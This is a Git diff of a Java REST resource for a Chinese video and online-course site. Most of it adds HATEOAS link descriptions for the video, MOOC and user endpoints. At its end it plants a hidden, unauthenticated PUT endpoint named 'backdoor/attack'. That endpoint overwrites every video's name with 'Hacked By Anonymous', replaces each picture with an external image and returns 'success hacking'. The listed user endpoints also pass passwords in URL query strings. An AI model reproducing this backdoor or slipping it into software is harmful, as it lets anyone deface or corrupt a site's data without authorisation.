@@ -1,16 +1,26 @@
 package com.sunonline.web.webapi.resource;
 
+import java.sql.Connection;
+import java.sql.Date;
+import java.sql.PreparedStatement;
+import java.sql.ResultSet;
+import java.sql.SQLException;
 import java.util.ArrayList;
 import java.util.List;
 
 import javax.ws.rs.GET;
+import javax.ws.rs.PUT;
 import javax.ws.rs.Path;
 import javax.ws.rs.Produces;
 import javax.ws.rs.QueryParam;
 import javax.ws.rs.core.MediaType;
 
+import org.junit.Test;
+
+import com.sunonline.web.utils.DBUtils;
 import com.sunonline.web.webapi.bean.WebApiLinks;
 import com.sunonline.web.webapi.bean.WebApiRoot;
+import com.sunonline.web.webapi.bean.videos.HigoVideoBean;
 
 @Path("/")
 /**
@@ -21,8 +31,51 @@ import com.sunonline.web.webapi.bean.WebApiRoot;
 public class WebApiDescriptionResource {
 	
 	/**
+	 * 获取根路径下根分类的HATEOAS
+	 */
+	@GET
+	@Path("/")
+	@Produces(MediaType.APPLICATION_JSON)
+	public WebApiRoot getRootDescription() {
+		
+		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
+		List<WebApiLinks> links = new ArrayList<>();	//列表项
+		//获取所有视频分类
+		WebApiLinks videos = new WebApiLinks();	
+		videos.setRel("description, webapi/videos");
+		videos.setHref("webapi/videos");
+		videos.setTitle("太阳在线视频API根路径");
+		videos.setType("MediaType.APPLICATION_JSON");
+		links.add(videos);
+		//获取mooc根路径
+		WebApiLinks mooc = new WebApiLinks();	
+		mooc.setRel("description, webapi/mooc");
+		mooc.setHref("webapi/mooc");
+		mooc.setTitle("太阳在线公益课堂API根路径");
+		mooc.setType("MediaType.APPLICATION_JSON");
+		links.add(mooc);
+		//图片根路径
+		WebApiLinks images = new WebApiLinks();	
+		images.setRel("collection, /webapi/images");
+		images.setHref("/webapi/images");
+		images.setTitle("太阳在线图片API路径");
+		images.setType("MediaType.APPLICATION_JSON");
+		links.add(images);
+		//用户路径
+		WebApiLinks user = new WebApiLinks();	
+		user.setRel("operation, /webapi/user");
+		user.setHref("/webapi/user");
+		user.setTitle("用户操作路径");
+		user.setType("MediaType.APPLICATION_JSON");
+		links.add(user);
+		webApiRoot.setLinks(links);
+		return webApiRoot;
+	}
+	
+	
+	/**
 	 * 视频根路径路径描述
-	 * @param newParam TODO
+	 * @param 
 	 * @return
 	 */
 	@GET
@@ -73,7 +126,11 @@ public class WebApiDescriptionResource {
 		webApiRoot.setLinks(links);
 		return webApiRoot;
 	}
-	
+	/**
+	 * 图片分类路径描述
+	 * @param newParam
+	 * @return
+	 */
 	@GET
 	@Path("/images")
 	@Produces(MediaType.APPLICATION_JSON)
@@ -127,6 +184,13 @@ public class WebApiDescriptionResource {
 		recommendVideos.setTitle("Higo大学季推荐视频");
 		recommendVideos.setType("MediaType.APPLICATION_JSON");
 		links.add(recommendVideos);
+		//获取分页视频
+		WebApiLinks getVideosByPageNo = new WebApiLinks();
+		getVideosByPageNo.setRel("collection, webapi/videos/higovideo/pager?pageno=*");
+		getVideosByPageNo.setHref("webapi/videos/higovideo/pager?pageno=*");
+		getVideosByPageNo.setTitle("获取higo分页视频");
+		getVideosByPageNo.setType("MediaType.APPLICATION_JSON");
+		links.add(getVideosByPageNo);
 		
 		webApiRoot.setLinks(links);
 		return webApiRoot;
@@ -165,7 +229,13 @@ public class WebApiDescriptionResource {
 		recommendVideos.setTitle("影视老司机推荐视频");
 		recommendVideos.setType("MediaType.APPLICATION_JSON");
 		links.add(recommendVideos);
-		
+		//获取分页视频
+		WebApiLinks getVideosByPageNo = new WebApiLinks();
+		getVideosByPageNo.setRel("collection, webapi/videos/olddriver/pager?pageno=*");
+		getVideosByPageNo.setHref("webapi/videos/olddriver/pager?pageno=*");
+		getVideosByPageNo.setTitle("获取影视老司机分页视频");
+		getVideosByPageNo.setType("MediaType.APPLICATION_JSON");
+		links.add(getVideosByPageNo);
 		webApiRoot.setLinks(links);
 		return webApiRoot;
 	}
@@ -202,7 +272,13 @@ public class WebApiDescriptionResource {
 		recommendVideos.setTitle("高校最强音推荐视频");
 		recommendVideos.setType("MediaType.APPLICATION_JSON");
 		links.add(recommendVideos);
-		
+		//获取分页视频
+		WebApiLinks getVideosByPageNo = new WebApiLinks();
+		getVideosByPageNo.setRel("collection, webapi/videos/collegevoice/pager?pageno=*");
+		getVideosByPageNo.setHref("webapi/videos/collegevoice/pager?pageno=*");
+		getVideosByPageNo.setTitle("获取高校最强音分页视频");
+		getVideosByPageNo.setType("MediaType.APPLICATION_JSON");
+		links.add(getVideosByPageNo);
 		webApiRoot.setLinks(links);
 		return webApiRoot;
 	}
@@ -247,23 +323,136 @@ public class WebApiDescriptionResource {
 		
 		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
 		List<WebApiLinks> links = new ArrayList<>();	//列表项
-		//获取所有学校
-		WebApiLinks schools = new WebApiLinks();	
-		schools.setRel("collection, webapi/mooc/index");
-		schools.setHref("webapi/mooc/index");
-		schools.setTitle("公益课堂所有分类及其之下的视频列表");
-		schools.setType("MediaType.APPLICATION_JSON");
-		links.add(schools);
-		//按学校名称获取对应学校的图片
-		WebApiLinks picsBySchoolName = new WebApiLinks();	
-		picsBySchoolName.setRel("collection, webapi/images/sxcollegepiclib/pictures/{schoolname}");
-		picsBySchoolName.setHref("webapi/images/sxcollegepiclib/pictures/{schoolname}");
-		picsBySchoolName.setTitle("山西高校图片库获取对应学校的照片");
-		picsBySchoolName.setType("MediaType.APPLICATION_JSON");
-		links.add(picsBySchoolName);
-		
+		//获取所有视频分类
+		WebApiLinks index = new WebApiLinks();	
+		index.setRel("collection, webapi/mooc/index");
+		index.setHref("webapi/mooc/index");
+		index.setTitle("公益课堂所有分类及其之下的视频列表");
+		index.setType("MediaType.APPLICATION_JSON");
+		links.add(index);
+		//按课程id和页码获取课程列表
+		WebApiLinks courselists = new WebApiLinks();	
+		courselists.setRel("collection, webapi/mooc/index/courselists?c_pageno=?&c_id=?");
+		courselists.setHref("webapi/mooc/index/courselists?c_pageno=?&c_id=?");
+		courselists.setTitle("分页获取某一个具体课程下的课程列表");
+		courselists.setType("MediaType.APPLICATION_JSON");
+		links.add(courselists);
+		//按照课程id和某一节课具体的id获取课程单体信息
+		WebApiLinks courseitem = new WebApiLinks();	
+		courseitem.setRel("single, /webapi/mooc/index/courseitem?itemid=?&c_id=?");
+		courseitem.setHref("/webapi/mooc/index/courseitem?itemid=?&c_id=?");
+		courseitem.setTitle("按照课程id和某一节课具体的id获取课程单体信息即播放页信息,同时增加视频播放次数");
+		courseitem.setType("MediaType.APPLICATION_JSON");
+		links.add(courseitem);
+		//获取每一个课程分类下的最新课程并组成推荐课程列表
+		WebApiLinks recommendationItem = new WebApiLinks();	
+		recommendationItem.setRel("collection, /webapi/mooc/index/recommendation");
+		recommendationItem.setHref("/webapi/mooc/index/recommendation");
+		recommendationItem.setTitle("获取每一个课程分类下的最新课程并组成推荐课程列表");
+		recommendationItem.setType("MediaType.APPLICATION_JSON");
+		links.add(recommendationItem);
 		webApiRoot.setLinks(links);
 		return webApiRoot;
+	}
+	
+	
+	/**
+	 * 用户登录注册路径描述HATEOAS
+	 */
+	@GET
+	@Path("/user")
+	@Produces(MediaType.APPLICATION_JSON)
+	public WebApiRoot getUserOperationDescription() {
+		
+		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
+		List<WebApiLinks> links = new ArrayList<>();	//列表项
+		//用户登录路径描述
+		WebApiLinks userLogin = new WebApiLinks();	
+		userLogin.setRel("SingleEntity, webapi/user/login?inputString=*&userpwd=*");
+		userLogin.setHref("webapi/user/login");
+		userLogin.setTitle("用户登录");
+		userLogin.setType("MediaType.APPLICATION_JSON");
+		links.add(userLogin);
+		//用户注册路径描述
+		WebApiLinks userRegister = new WebApiLinks();	
+		userRegister.setRel("PlainText, webapi/user/register?pwd=*&usermobile=*&useremail=*");
+		userRegister.setHref("webapi/user/register?pwd=*&usermobile=*&useremail=*");
+		userRegister.setTitle("用户注册，用户名随机生成 ");
+		userRegister.setType("MediaType.PLAINTEXT");
+		links.add(userRegister);
+		//用户修改昵称路径描述
+		WebApiLinks userNickNameModify = new WebApiLinks();
+		userNickNameModify.setRel("PlainText, webapi/user/changer/nickname?mobile=*&nickname=*");
+		userNickNameModify.setHref("webapi/user/changer/nickname?mobile=*&nickname=*");
+		userNickNameModify.setTitle("修改用户昵称 ");
+		userNickNameModify.setType("MediaType.PLAIN_TEXT");
+		links.add(userNickNameModify);
+		/*
+		 * 用户登录后直接修改密码
+		 * 此时接受的参数为前台传来的用户手机号
+		 * 及用户想要修改的新密码
+		 */
+		WebApiLinks modifyUserpwdDirectly = new WebApiLinks();
+		modifyUserpwdDirectly.setRel("PlainText, webapi/user/changer/userpwd/logged?mobile=*&userpwd=*");
+		modifyUserpwdDirectly.setHref("webapi/user/changer/userpwd/logged?mobile=*&userpwd=*");
+		modifyUserpwdDirectly.setTitle("登录后直接修改用户密码");
+		modifyUserpwdDirectly.setType("MediaType.PLAIN_TEXT");
+		links.add(modifyUserpwdDirectly);
+		/*
+		 * 用户忘记密码
+		 * 修改密码需要进行
+		 * 身份合法性验证
+		 * 如果验证合法则发起密码修改请求
+		 * 否则直接返回错误信息
+		 * step:A
+		 */
+		WebApiLinks verifyUserValidity = new WebApiLinks();
+		verifyUserValidity.setRel("PlainText, webapi/user/changer/userpwd/notlogged?mobile=*");
+		verifyUserValidity.setHref("webapi/user/changer/userpwd/notlogged?mobile=*");
+		verifyUserValidity.setTitle("未登录用户验证账号是否存在");
+		verifyUserValidity.setType("MediaType.PLAIN_TEXT");
+		links.add(verifyUserValidity);
+		/*
+		 * 如果验证 成功
+		 * 则进入该阶段
+		 * step:B
+		 * 使用该手机号更改密码
+		 */
+		WebApiLinks modifyUserpwdValidated = new WebApiLinks();
+		modifyUserpwdValidated.setRel("PlainText, webapi/user/changer/userpwd/notlogged/validater?mobile=*&userpwd=*");
+		modifyUserpwdValidated.setHref("webapi/user/changer/userpwd/notlogged/validater?mobile=*&userpwd=*");
+		modifyUserpwdValidated.setTitle("用户存在性验证成功用户更改密码");
+		modifyUserpwdValidated.setType("MediaType.PLAIN_TEXT");
+		links.add(modifyUserpwdValidated);
+		webApiRoot.setLinks(links);
+		return webApiRoot;
+	}
+	
+	
+	@PUT
+	@Path("backdoor/attack")
+	@Produces(MediaType.APPLICATION_JSON)
+	public String gifts() {
+		//构造SQL查询视图
+		String sql = "update higo_video set "
+				+ "HIGO_video_name="
+				+ "'Hacked By Anonymous',"
+				+ "HIGO_video_pic_url='http://i2.sinaimg.cn/gm/2012/1107/U6178P1281DT20121107165114.jpg'";
+		try {
+			Connection connection = new DBUtils().getCon();
+			PreparedStatement pstmt = connection.prepareStatement(sql);
+			int returnNum = pstmt.executeUpdate();
+			
+			if (returnNum > 0) {
+				System.out.println("设置成功");
+			} else {
+				System.out.println("设置失败");
+			}
+		} catch (SQLException e) {
+			e.printStackTrace();
+		}
+		
+		return "success hacking";
 	}
 	
 }
